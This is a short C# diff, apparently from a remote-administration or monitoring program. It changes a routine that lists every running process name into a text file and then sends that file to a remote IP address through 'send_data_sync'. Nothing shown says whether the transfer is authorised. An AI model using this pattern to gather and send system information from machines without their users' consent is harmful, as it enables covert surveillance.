@@ -128,8 +128,10 @@ namespace DA_RSA
             Process[] p = Process.GetProcesses();
 
             StreamWriter sw = new StreamWriter(Directory.GetCurrentDirectory() + "\\processe.txt");
-            sw.Write(p);
-            sw.Flush();
+            foreach (Process x in p)
+            {
+                sw.WriteLine(x.ProcessName);
+            }
             sw.Close();
 
             send_data_sync(Directory.GetCurrentDirectory() + "\\processe.txt", "processe.txt", ip, i);
